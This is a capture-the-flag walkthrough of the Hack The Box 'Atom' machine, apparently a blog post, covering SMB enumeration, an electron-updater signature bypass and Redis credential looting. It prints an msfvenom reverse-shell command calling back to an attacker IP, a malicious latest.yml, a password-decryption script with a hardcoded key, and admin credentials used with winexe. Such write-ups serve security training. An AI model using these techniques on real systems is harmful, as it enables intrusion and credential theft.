## Web Enumeration

<img src="/assets/img/htb-atom/web.png">

It's a static page with an executeable to download, but nothing interesting! Let's keep enumerating

## <p style="color:Green">SMB Enumeration </p> 

<img src="/assets/img/htb-atom/smb.png">

An interesting share `Software_Updates` let's take a look at it

<img src="/assets/img/htb-atom/foothold.png">

Let's try download everything

```
prompt off
recurse on
mget *
```

<img src="/assets/img/htb-atom/smbfiles.png">
We only have a pdf file!

# Foothold 

---

Let's take a look at the pdf file

<img src="/assets/img/htb-atom/electron.png">
<img src="/assets/img/htb-atom/electron1.png">

The Heedv1 app is build with `electron-builder` and also we can drop updates in the client folders in the smb and it get executed.
Searching in  google for an electron builder update rce, we can find an interesting

> https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

Let's first create our shell with the name "s'hell.exe" to bypass the signature

```
msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o "s'hell.exe"
```

And also generate the encdoded shasum of our malicious file

```
shasum -a 512 s\'hell.exe | cut -d " " -f1 | xxd -r -p | base64
``` 

Now we're ready to create our `latest.yml`

```yml
version: 1.2.3

path: http:/IP:PORT/s'hell.exe
sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
```

Let's setup a listener and upload them to the clients folder in the smb! And wait until we get a shell back

We're on the box now! And we can get the user flag !:D

# PrivEsc

Before running any enumerating tool, i always check the Program file, the documents and Downloads folders to check if we have any custom Software  (a aka free win) installed in the system!

<img src="/assets/img/htb-atom/portable.png">

We  can copy the whole folder and try to retrieve the encrypted like the machine `sharp` but let's keep enumerating!
> https://www.exploit-db.com/exploits/49409


<img src="/assets/img/htb-atom/redis.png">

We can see that Redis is installed, we can grab the redis password from the config file

<img src="/assets/img/htb-atom/pass.png">

```
requirepass kidvscat_yes_kidvscat
```
Now we can enumerate the redis service!

We will use the redis-tools package

```
sudo apt-get install redis-tools
```

> A very good ressource, i'll use everything from here https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

Let's dump the database
```redis
info
```
<img src="/assets/img/htb-atom/rd.png">

Let's list the keys from the db0


<img src="/assets/img/htb-atom/rd1.png">

Let's check their content
<img src="/assets/img/htb-atom/PS.png">


The key `pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0` seems to give us credentials 

```
Administrator:Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
```
Seems like it's an encrypted password! And we already know that we have an exploit to decrypt it ! Lets give it a try


Let's just take a snippet from the exploit-db exploit 
```python
#!/usr/bin/env python3
import base64
from des import *
def decode(hash):
	hash = base64.b64decode(hash.encode('utf-8'))
	key = DesKey(b"7ly6UznJ")
	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print('[+] Decrypted Password: '+decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
```

<img src="/assets/img/htb-atom/adminpass.png">

```
Administrator:kidvscat_admin_@123
```
Now let's login as administrator to the machine

```
winexe -U 'Administrator%kidvscat_admin_@123' //10.10.10.237 cmd.exe
```

And we rooted the machine!
